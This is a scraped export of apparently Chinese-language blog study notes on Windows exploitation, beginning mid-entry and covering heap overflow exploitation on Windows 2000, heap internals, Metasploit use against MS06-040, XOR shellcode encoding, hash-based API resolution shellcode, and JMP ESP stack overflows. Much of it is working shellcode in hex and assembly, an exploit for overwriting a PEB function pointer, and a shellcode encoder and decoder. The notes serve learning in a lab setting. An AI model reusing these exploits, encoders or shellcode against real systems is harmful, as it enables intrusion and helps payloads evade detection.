\u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // 200 字节堆区结束，以下是溢出数据 \u0026#34;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\u0026#34; // 下一个堆块的块首，保留 \u0026#34;\\x88\\x06\\x36\\x00\u0026#34; // ShellCode起始地址 \u0026#34;\\x20\\xF0\\xFD\\x7F\u0026#34;; // PEB同步函数指针位置 int main() { HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); // __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow,0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0; } 总结 这就是完整的ShellCode了，可以顺利利用Win2000的堆溢出弹出MessageBox了 ","date":"2020-10-22T16:56:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-007-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8/","title":"漏洞利用学习笔记-007-堆溢出的利用"},{"content":"声明：实验环境为 Windows 2000\n本文来源：Moeomu的博客\n堆的介绍 与栈的区别 堆是由程序员使用malloc等函数向操作系统申请的一块内存空间，它能否成功与操作系统的状态有极大的关系，与管理整齐的栈不同，它的管理以及分配算法都是非常奇特的 堆在释放时由程序员使用free或delete释放，而栈是系统自动释放的 堆的地址范围变化很大，而栈的内存地址总是0x0012XXXX 堆的地址由低向高移动，栈的地址由高向低移动 堆的安全 堆是杂乱无章的，所以它的利用相对于栈会困难很多，而堆的管理微软从未公开，研究有一定困难 在Windows2000 - Windows XP SP1，堆管理未考虑安全因素，容易利用 在Windows XP SP2 - Windows 2003，加入了块首的cookie，指针验证等 Windows Vista - Windows 7，堆管理的安全，稳定和效率都改变巨大 堆的数据结构和管理策略 两种堆结构 堆块：堆区的内存按不同大小组织成块，以堆块为单位进行标识。 块首：本块的大小，是否占用 块身：数据区 堆表：位于堆区的起始位置，可索引堆区的所有重要信息，包括堆块的大小，位置，是否占用。堆表往往用不止一种数据结构来表示。 Windows中，占用态的堆块只有占用它的程序索引，堆表只索引空闲态的堆块。 Windows中重要的堆表： 空闲双向链表：(Freelist)(空表) 空表包含128个数组，第二个数组freelist[1]标识8字节的空堆空间，之后每项逐个递增8字节 空闲堆块大小(包含堆首) = 索引项 * 8(字节) freelist[0]标识了所有大小大于1024字节的堆块(小于等于512KB)，它们按从小到大的顺序依次升序排列 快速单向链表(Lookaside)(快表) 快表包含128条数据，组织结构与空表类似，但是单链表 总被初始化为空，每条快表最多4个节点 每个节点都被初始化为已占用，所以不会发生堆块合并现象 管理策略 堆块分配 零号空表分配：按照大小升序链着大小不同的空闲块，从free[0]反向查找最后一个块，再正向搜索最小能够满足要求的空闲堆块进行分配 普通空表分配：寻找最优空闲空间分配，其次找次优 快表分配：寻找大小匹配的表，从堆表卸下，返回一个指向堆块的指针给程序 当空表无法找到最优堆块时，一个稍大些的块会被用于分配，此为次优分配，会先从大块中按照请求的大小精确地割出一块进行分配，然后给剩下的部分重新标注块首，连入空表。 快表只有精确匹配时才会分配，所以不存在以上现象 堆块释放 将堆块状态改为空闲，链入相应的堆表。所有释放的块将链入堆表的末尾，分配的时候也先从堆表末尾拿。 堆块合并 反复申请和释放堆区将产生很多内存碎片，为了合理有效地利用内存将合并一些堆块 这个操作包含两个块从空闲链表中卸下，合并堆块，调整合并后的大块的块首信息，将新块重新链入空闲链表 堆区还将进行内存紧缩(shrink the compact)由RtlCompactHeap执行，将对整个堆进行调整，尽量合并可用的碎片 堆块分配和释放的策略 小块(SIZE\u0026lt;1KB) 分配 首先进行快表分配，机械能普通空表分配 若失败，使用堆缓存(heap cache)分配 若堆缓存分配失败，内存紧缩后尝试分配 若无法分配，返回NULL 释放 优先链入快表(只能链入4个空闲块) 若快表满，链入相应空表 大块(1KB\u0026lt;=SIZE\u0026lt;512KB) 分配 使用堆缓存分配 若堆缓存分配失败，使用free[0]中的大块进行分配 释放 优先将它放入堆缓存 若堆缓存满，将链入freelists[0] 巨块(SIZE\u0026gt;=512KB) 分配：虚分配(并非从堆区分配) 释放：直接释放，无堆表操作 实践 血的教训：无论是空表还是快表，它Blink/Flink指针指向的永远是下/上一个节点的Blink/Flink\n测试空表 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;windows.h\u0026gt; void main() { HLOCAL h1, h2, h3, h4, h5, h6; HANDLE hp; hp = HeapCreate(0, 0x1000, 0x10000); __asm int 3; h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3); h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 5); h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 6); h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 19); h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24); //free block and prevent coaleses HeapFree(hp, 0, h1); // free to freelist[2] HeapFree(hp, 0, h3); // free to freelist[2] HeapFree(hp, 0, h5); // free to freelist[4] HeapFree(hp, 0, h4); // coalese h3 h4 h5 link the large block to freelist[8] } 观察 INT异常调起调试器，未运行 HeadCreate()创建堆区后，将堆区指针交给EAX，观察到此时地址为0x360000 查看内存区域0x360000，依次向后的信息是(抄的，反正我也不知道这几个结构具体多大)段表索引(SegmentList)，虚表索引(VirtualAllocationList)，空表使用标识(freelist usage bitmap)和空表索引区 在偏移0x178处找到了空表索引，其内容是0x00360688，说明freelist[0]指向了偏移为0x688的地方，我们来康康这个地方存了什么 这个地方存了0x00360178，妙啊，指向了freelist[0]，绕了一圈指向了自己，而这个freelist[0]看来指向的就是唯一一个空闲的堆区，一般称为“尾块” 根据堆块的结构(在下面嘞)易得，实际这个堆块开始于0x00360680，看起来堆块指针越过了堆块块首，直接指向了数据区 0x1-0x2字节是自身大小，此时这个值是0x0130，说明这个堆的大小是0x130个字节 0x3-0x4字节是前一个堆块大小，这个值是0x08(???不是说好了唯一???) 0x5字节是索引，此时为0 0x6字节是Flag，此时这是1 0x7是保留字节，是0 0x8字节是标签索引(调试态)，不知道干啥的，是0 0x9-0xC(空堆块专属)字节是前一个空堆块的地址，是0x00360178 0xD-0x10(空堆块专属)字节是后一个空堆块的地址，同样是0x00360178 运行六次分配 0x00360680-0x00360688为h1块首，0x00360689-0x0036068F是8个字节的块身，内容是00 00 00 00 78 01 36 00 0x00360690-0x00360698为h2块首，0x00360699-0x0036069F是8个字节的块身，内容是00 00 00 00 00 01 36 00 0x003606A0-0x003606A8为h3块首，0x003606A9-0x003606AF是8个字节的块身，内容是00 00 00 00 00 00 36 00 0x003606B0-0x003606B8为h4块首，0x003606B9-0x003606BF是8个字节的块身，内容是00 00 00 00 00 00 00 00 0x003606C0-0x003606C8为h5块首，0x003606C9-0x003606DF是24个字节的块身，内容是00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x003606E0-0x003606E8为h5块首，0x003606E9-0x003606FF是24个字节的块身，内容是00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 释放堆 第一次释放的堆块大小为16字节的堆块，所以连接到了freeList[2]，也就是0x188的位置，此时内容为0x00360688 第二次释放的堆同样连接到了freeList[2]，细节不再描述 第三次释放的堆同样连接到了freeList[2]，细节不再描述 第四次释放时，h3，h4，h5相邻，所以它们合并了，其中h3h4的大小各是2个堆单位，h5则是4个，那么它们合并后共计8个堆单位，除去要存放一个堆首，它们还剩7个堆单位，所以放入freeList[8] 结论 堆表中包含的信息依次是段表索引(SegmentList)，虚表索引(VirtualAllocationList)，空表使用标识(freelist usage bitmap)和空表索引区 当一个堆刚刚被初始化时，它的堆块状况 只有一个空闲态的大块，这个块被称为“尾块” 之后是快表 Freelist[0]指向“尾块” 除了零号空表索引外，区域各项索引都指向自己，这意味着其余所有的空闲链表中都没有空闲块 占用态块首 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 struct Flag { BIT Busy; BIT ExtraPresent; BIT FillPattern; BIT VirtualAlloc; BIT LastEntry; BIT FFU1; BIT FFU2; BIT NoCoalesce; } struct BusyHeapHeadBlock // 8 Byte Head { USHORT SelfSize; USHORT PreviousChunkSize; UCHAR SegmentIndex; struct Flag Flags; UCAHR UnusedBytes; UCAHR TagIndex_Debug; } // Data After... 空闲态块首 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 struct Flag { BIT Busy; BIT ExtraPresent; BIT FillPattern; BIT VirtualAlloc; BIT LastEntry; BIT FFU1; BIT FFU2; BIT NoCoalesce; } struct BusyHeapHeadBlock // 16 Byte Head { USHORT SelfSize; USHORT PreviousChunkSize; UCHAR SegmentIndex; struct Flag Flags; UCAHR UnusedBytes; UCAHR TagIndex_Debug; PVOID FlinkInFreelist; // 下一个 PVOID BlinkInFreelist; // 上一个 } // Empty Data After... 堆块的分配 堆块的大小包括了块首，所以申请32字节将会分配40字节 堆块的单位是8字节，不足8字节的按照8字节分配，所以最少实际分配为16字节 初始状态下，快表和空表都为空，不存在精确分配，请求将使用次优块进行分配 由于次优分配的发生，分配函数将从尾块中切走一些小块，修改尾块块首的size，最后将freelist[0]指向新的尾块 测试快表 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; void main() { HLOCAL h1, h2, h3, h4; HANDLE hp; hp = HeapCreate(0, 0, 0); __asm int 3 h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16); h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24); HeapFree(hp, 0, h1); HeapFree(hp, 0, h2); HeapFree(hp, 0, h3); HeapFree(hp, 0, h4); h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16); HeapFree(hp, 0, h2); } 结论 块首标识位为0x01 只存指向下一堆块的指针，不存在指向前一堆块的指针 偏移0x178处的freeList[0]的地址变为了0x00361E90，原本的0x00360688被快表霸占了 快表从0x688开始，每个结构共0x30个字节，前四个字节的内容是快表单链表 虽然0Day安全书中写道，8字节的堆区被插入lookaside[1]，但是我似乎觉得，0x688处的才是lookaside[0]，0x6B8处的才是lookaside[1]，而0x0E8处的可以被称为lookaside[2]，它存放的堆块带上块首的大小一共16个字节 ","date":"2020-10-20T23:10:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-006-%E5%A0%86%E7%9A%84%E5%85%A5%E9%97%A8/","title":"漏洞利用学习笔记-006-堆的入门"},{"content":"本文来源：Moeomu的博客\n\u0026hellip;未完待续(Metasploit旧版本真难找)\u0026hellip;\n入侵Windows实验 实验介绍 MS06-040，CVE-2006-3439\n推荐的环境 备注 攻击机系统 Kali Linux 2021.1 目标主机系统 Windows 2000 SP4 补丁版本 KB921883 确保目标主机未安装补丁 网络环境 可互相ping通 确保无防火墙干扰 命令行界面漏洞测试 use exploit/windows/smb/ms06_040_netapi set rhosts 10.211.55.5 exploit 使用MetaSploit制作ShellCode \u0026hellip;未完待续\u0026hellip;\n","date":"2020-10-20T22:20:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-005-metasploit%E5%88%B6%E4%BD%9Cshellcode/","title":"漏洞利用学习笔记-005-Metasploit制作ShellCode"},{"content":" 点击此处下载本文附可执行程序，shellcode文件\n本文来源：Moeomu的博客\n异或编码 注意事项 在选取编码字节时，不可与已有字节相同，否则会出现0 可以使用多个不同编码字节对不同区域编码，但会增加复杂度 可以对shellcode进行多轮编码 实现代码(ExpStd0401) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 void encoder(char* input, unsigned char key, int display_flag) { int i = 0, len = 0; FILE* fp; unsigned char * output; len = strlen(input); output = (unsigned char*)malloc(len + 1); if(!output) { printf(\u0026#34;memory error!\\n\u0026#34;); exit(0); } // encode shellcode for(i = 0; i \u0026lt; len; i++) { output[i] = input[i] ^ key; } if(!(fp=fopen(\u0026#34;encode.txt\u0026#34;, \u0026#34;w+\u0026#34;))) { printf(\u0026#34;output file create error!\u0026#34;); exit(0); } fprintf(fp, \u0026#34;\\\u0026#34;\u0026#34;); for(i = 0; i\u0026lt; len; i++) { fprintf(fp, \u0026#34;\\\\x%0.2x\u0026#34;, output[i]); if((i + 1 % 16 == 0)) { fprintf(fp, \u0026#34;\\\u0026#34;\\n\\\u0026#34;\u0026#34;); } } fprintf(fp, \u0026#34;\\\u0026#34;;\u0026#34;); fclose(fp); printf(\u0026#34;dump the encoded shellcode to encode.txt OK!\\n\u0026#34;); if(display_flag) { for(i = 0; i \u0026lt; len; i++) { printf(\u0026#34;%0.2x \u0026#34;, output[i]); if((i + 1) % 16 == 0) { printf(\u0026#34;\\n\u0026#34;); } } } free(output); } 解码代码(ExpStd0402) 解码器与shellcode联合执行 默认EAX在shellcode开始时对准shellcode起始位置 shellcode最后一个字节为0x90 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void main() { __asm { add eax, 0x14 ;越过decoder记录shellcode起始地址 xor ecx, ecx decode_loop: mov bl, [eax + ecx] xor bl, 0x44 ;用0x44作为key mov [eax + ecx], bl inc ecx cmp bl, 0x90 ;末尾放一个0x90作为结束符 jne decode_loop } } ShellCode减少体积 方法 挑选短指令 xchg eax, reg ;交换eax和其它寄存器的值 lodsb ;esi指向的一个dword装入eax，并且增加esi lodsd ;把esi指向的一个byte装入al，并增加esi stosd ;将eax的内容复制到edi的内存地址中，每复制四个字节，edi就加0x4，ecx为大小 stosb ;将eax的内容复制到edi的内存地址中，每复制一个字节，edi就加0x4，ecx为大小 pushad/popad ;从栈中存储/恢复所有寄存器的值 cdq ;用edx把eax扩展成四字，在eax\u0026lt;0x80000000时可用作mov edx, 0 复合指令，合并使用指令 API参数压栈前将栈空间一片区域置为0，压栈时只要压入非0参数即可 代码当数据用，数据当代码用 栈顶之上数据若有用，抬高栈顶保护它以便以后使用 调用API时有些寄存器总是被保存在栈中，但是大多数函数运行时不会使用EBP，因此可以用EBP保存数据 HASH算法存储API 选择适当的HASH算法 8bit最多表示256个不同的字符，不可避免会有碰撞，但是如果所需函数位于碰撞的第一个，那么也可以使用 即碰撞是可以部分容忍的 ","date":"2020-10-20T09:20:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-004-shellcode%E7%BC%96%E7%A0%81/","title":"漏洞利用学习笔记-004-ShellCode编码"},{"content":" 点击此处下载本文附可执行程序，shellcode文件\n本文来源：Moeomu的博客\n通过TEB定位API地址 定位Kernel32.dll 程序加载时，用户态下[FS:0]寄存器中存放TEB地址 TEB偏移0x30的位置[TEB + 0x30]存放PEB的地址 PEB偏移0xC的位置[PEB + 0xC]存放PEB_LDR_DATA 关于PEB_LDR_DATA结构，微软官方的说明点此，C语言表示如下 1 2 3 4 5 typedef struct _PEB_LDR_DATA { BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA; 以下是我的调试结果\n1 2 3 4 5 6 7 8 9 10 11 typedef struct _PEB_LDR_DATA { INT Length; UCHAR Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID EntryInProgress; UCHAR ShutdownInProgress; PVOID ShutdownThreadId; } PEB_LDR_DATA, *PPEB_LDR_DATA; 我们需要读取InInitializationOrderModuleList(初始化加载模块列表)来取得Kernel32.dll的地址，而此列表是LIST_ENTRY结构，此结构的微软官方说明如下 1 2 3 4 typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink; struct _LIST_ENTRY *Blink; } LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY; 我的调试结果：\n1 2 3 4 5 6 typedef struct LinkNode { _LIST_ENTRY Flink; _LIST_ENTRY Blink; PVOID DllAddress; } 由此可见，在链表节点的+0xC处存在DllAddress，而任何程序前三个节点均为Ntdll -\u0026gt; KernelBa -\u0026gt; Kernel32 定位API地址(逆向Kernel32.dll) 上一小节获得了Kernel32的加载基址，此小节由此获取LoadLibrary和GetProcAddress的地址用于获取其它函数地址\n偏移0x3C是PEHeader的入口，标志字为0x5045，文字为PE 再加上0x78的偏移是导出函数地址表的地址(Export Directory RVA)，此时的偏移为0x168，值为0x262C 再加上0x4的偏移是导出函数地址表的大小(Export Directory Size)，值是0x6CFD 在磁盘上时，节大小的最小单位是0x200，但加载到内存中，节大小的最小单位变为0x1000，而PE文件头在文件中占据的大小是0x400，但是映射到内存中将占据0x1000的大小，大小差值为0xC00，所以0x262C应当减去0xC00，得到导出目录表Export Directory的地址0x1A2C 在导出目录表的0x28偏移处是第一个导出函数的地址，序列号为0 在导出目录表的0x67C偏移处是函数GetProcAddress的地址，序列号为198 在导出目录表的0x340偏移处是函数LoadLibraryA的地址，序列号为244 至此，两个重要函数的地址找到了 调试ShellCode(ExpStd0301) 1 2 3 4 5 6 7 8 9 10 11 char shellcode[] = \u0026#34;\\x10\\x10\u0026#34;; void main() { __asm { lea eax, shellcode push eax ret } } 动态API加载ShellCode 理论分析 需要的API函数 MessageBoxA(User32.dll) ExitProcess(Kernel32.dll) LoadLibraryA(Kernel32.dll) 一个难题：如何在需要ShellCode尽可能短的情况下(不存在函数名称)找到API的地址 函数名的HASH算法 理论 需要引入额外的HASH算法 计算的结果称为DIGEST(摘要) 对搜索到的函数名进行HASH 算法(ExpStd0302) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; DWORD GetHash(char *fun_name) { DWORD digest = 0; while(*fun_name) { digest = ((digest \u0026lt;\u0026lt; 25) | (digest \u0026gt;\u0026gt; 7)); digest += *fun_name; fun_name++; } return digest; } void main() { DWORD hash; hash = GetHash(\u0026#34;MessageBoxA\u0026#34;); printf(\u0026#34;Hash is %s\u0026#34;, hash); } 最终ShellCode(ExpStd0303) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 int main() { _asm{ ;flag nop nop nop nop nop cld ;clear flag DF ;store hash push 0x1e380a6a ;hash of MessageBoxA push 0x4fd18963 ;hash of ExitProcess push 0x0c917432 ;hash of LoadLibraryA mov esi, esp ;esi = addr of first func hash lea edi, [esi-0xc] ;edi = addr to start writing func ;make some stack space xor ebx, ebx mov bh, 0x04 sub esp, ebx ;push a pointer to \u0026#34;user32\u0026#34; onto stack mov bx, 0x3233 ;rest of ebx is null push ebx push 0x72657375 push esp xor edx, edx ;find base addr of kernel32.dll mov ebx, fs:[edx + 0x30] ;ebx = PEB address mov ecx, [ebx + 0x1c] ;ecx = loader data pointer mov ecx, [ecx + 0x1c] ;ecx = first entry in Initialization order list mov ecx, [ecx] ;ecx = second entry mov ebp, [ecx + 0x08] ;ebp = base address of kernel32.dll find_lib_functions: lodsd ;load next hash into al and increment esi cmp eax, 0x1e380a6a ;hash of MessageBoxA - trigger and LoadLibrary(\u0026#34;user32\u0026#34;) jne find_functions xchg eax, ebp ;save current hash call [edi - 0x8] ;LoadLibraryA xchg eax, ebp ;restore current hash and update ebp with base address of user32.dll find_functions: pushad ;preserve registers mov eax, [ebp + 0x3c] ;eax = start of PEheader mov ecx, [ebp + eax + 0x78];ecx = relative offset of export table add ecx, ebp ;ecx = absolute addr of export table mov ebx, [ecx + 0x20] ;ebx = relative offset of names add ebx, ebp ;ebx = absolute addr of names table xor edi, edi ;edi will count through the functions next_function_loop: inc edi ;inc function counter mov esi, [ebp + edi * 4] ;esi = relative offset of current function name add esi, ebp ;esi = absolute addr of current function name cdq ;dl will hold hash (we know eax is small) hash_loop: movsx eax, byte ptr[esi] cmp al, ah jz compare_hash ror edx, 7 add edx, eax inc esi jmp hash_loop compare_hash: cmp edx, [esp + 0x1c] ;compare to the requested hash(saved on stack from pushad) jnz next_function_loop mov ebx, [ecx + 0x24] ;ebx = relative offset of ordinals table add ebx, ebp ;ebx = absolute addr of ordinals table mov di, [ebx + 2 * edi] ;di = ordinal number of matched function mov ebx, [ecx + 0x1c] ;ebx = relative offset of address table mov ebx, ebp ;ebx = absolute addr of address table add ebp, [ebx + 4 * edi] ;add to ebp(base addr of module) the relative offset of matched function xchg eax, ebp ;move func addr into eax pop edi ;edi is last onto stack in pushad stosd ;write function addr to [edi] and increment edi push edi popad ;restore registers and loop until we reach end of alst hash cmp eax, 0x1e380a6a jne find_lib_functions function_call: xor ebx, ebx push ebx ;cut string push 0x74736577 push 0x6c696166 ;push failwest mov eax, esp ;load address of failwest push ebx push eax push eax push ebx call [edi - 0x4] ;call MessageBoxA push ebx call[edi - 0x8] ;call ExitProcess ;flag nop nop nop nop } } ","date":"2020-10-19T20:20:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-003-api%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/","title":"漏洞利用学习笔记-003-API动态加载"},{"content":" 点击此处下载本文附可执行程序，shellcode文件\n本文来源：Moeomu的博客\n栈空间移位 ShellCode在内存中往往是动态的，并非直接填写一个定值\n也就是前一篇中buffer数组的栈空间地址，并非总是个定值\n当CPU执行到此地址时，有可能触发无效指令异常导致程序崩溃，ShellCode无法运行\n原理 从程序已加载的系统DLL中查找一个JMP ESP指令的地址，用此地址去淹没返回地址\n这样既能精准定位shellcode的位置，又能适应栈空间的动态变化\n栈的地址是上小下大，CPU的执行顺序是小地址到大地址，栈淹没同样从小地址淹没到大地址\n这样只要将前面的一段空间淹没为无意义数据，将ShellCode的开始恰好淹没在[ESP]处，就可以达到ShellCode动态寻址\nShellCode编写 结构 无用数据+JMP ESP地址(此地址恰好淹没到函数返回地址)+命令代码(用于测试，MessageBox弹窗)\n说明：\nretn后将会跳到JMP ESP处，随后ESP + 4 JMP ESP后将会正好跳到命令代码处 必要数据 JMP ESP地址：位于User32.dll中0x77D29353(没必要必须是原版命令，只要搜二进制0xFFE4即可) 垃圾数据大小：52 Byte = Buffer(44 Byte) + authenticated(4 Byte) + EBP(4 Byte) 最终Code 以下是需要执行的命令代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 33DB xor ebx,ebx 53 push ebx 68 6D756F6F push 0x6F6F756D 68 4D6F656F push 0x6F656F4D 8BC4 mov eax,esp 53 push ebx 50 push eax 50 push eax 53 push ebx B8 EA07D577 mov eax,user32.MessageBoxA FFD0 call eax B8 FACA817C mov eax,kernel32.ExitProcess FFD0 call eax 最终的ShellCode\n1 2 3 4 5 6 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 53 93 D2 77 33 DB 53 68 6D 75 6F 6F 68 4D 6F 65 6F 8B C4 53 50 50 53 B8 EA 07 D5 77 FF D0 B8 FA CA 81 7C FF D0 ","date":"2020-10-19T18:20:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-002-esp%E8%B7%B3%E6%9D%BF/","title":"漏洞利用学习笔记-002-ESP跳板"},{"content":" 功能性逻辑缺陷(Bug) 安全性逻辑缺陷(Vulnerability) 点击此处下载本文附代码，可执行程序，shellcode文件\n本文来源：Moeomu的博客\nPE概念 PE文件与虚拟内存之间的映射 ImageBase：装载基址，对(.EXE)是0x00400000，对(.DLL)是0x10000000 FileOffset：文件偏移地址 VirtualAddress：虚拟地址，是映射到内存中的地址 RelativeVirtualAddress：相对虚拟地址，是虚拟地址VA相对装载基址的偏移量 VA = ImageBase + RVA\n数据补全填充规则 在磁盘上时，PE文件的每个节(.section)是以0x200字节为单位存放，当节的大小不足0x200时，使用0x0补全，当节的大小超过0x200时，分配下一个0x200大小给此节 在内存中时，PE文件的每个节(.section)是以0x1000字节为单位存放，规则同上 SectionOffset = RVA - FileOffset\nFileOffset = VA - ImageBase - SectionOffset = RVA - SectionOffset\n例如.text节RVA=0x1000，FileOffset=0x400，则SectionOffset=0xC00\n0x00404141处指令文件偏移为0x00404141-0x00400000-(0x1000-0x400)=0x3541\n函数调用约定 C SysCall StdCall BASIC FORTRAN PASCAL 参数入栈顺序 右-\u0026gt;左 右-\u0026gt;左 右-\u0026gt;左 左-\u0026gt;右 左-\u0026gt;右 左-\u0026gt;右 恢复栈平衡的位置 母函数 子函数 子函数 子函数 子函数 子函数 缓冲区溢出 栈帧相邻，局部变量相邻，若数组越界，则会覆盖局部变量，接着覆盖函数返回地址\n通过淹没栈帧返回地址值以控制程序流程\nShellCode Exploit/ShellCode(Payload)的分工合作 Exploit的作用是精准利用某种漏洞，目标是劫持EIP ShellCode将执行恶意/善意代码，是攻击载荷 ShellCode一般是通用的，Exploit只能针对某个特定的漏洞工作 实例 本例使用简单的密码验证来测试漏洞\n缓冲区溢出控制程序Flag 代码(ExpStd0101) 编译环境：Windows XP SP3, Visual C++ 6, Debug\n实验环境：Windows XP SP3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password(char *password) { int authenticated; char buffer[8]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); return authenticated; } int main() { int valid_flag = 0; char password[1024]; while(1) { printf(\u0026#34;Input Number:\u0026#34;); scanf(\u0026#34;%s\u0026#34;, password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;ERROR!\u0026#34;); } else { printf(\u0026#34;OK!\u0026#34;); break; } } } 分析(ExpStd0101) 简易分析\n当输入99999999时，它的末尾'\\0'将第9个字节填充，正好将authenticated的最低位1个字节0x1改为0x0 这也和strcmp函数有关系，如果str1\u0026lt;str2那authenticated的值-1以反码FFFFFFFF存储，此时即使将低位FF溢出为00也无用，所以并非全部的8位字符都可以绕过验证 进一步验证\n当输入8个9时，8字节的buffer填满，覆盖1字节的authenticated空间 当输入11个9时，8字节的buffer填满，覆盖4字节的authenticated空间，即authenticated被完全覆盖，它被冲刷为0x0039393939 当输入15个9时，8字节的buffer填满，覆盖4字节的authenticated空间，本函数EBP所在空间也被覆盖(内容是父函数EBP) 当输入19个9时，8字节的buffer填满，覆盖4字节的authenticated空间，覆盖4字节的EBP空间，覆盖4字节的返回地址 更进一步验证\n由于键盘无法输入一些不可见字符，所以更换为读取文件验证 硬编码地址控制程序流程 使用FILE来进行文件的读取\n代码(ExpStd0102) 编译环境：Windows XP SP3, Visual C++ 6, Debug\n实验环境：Windows XP SP3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #define PASSWORD 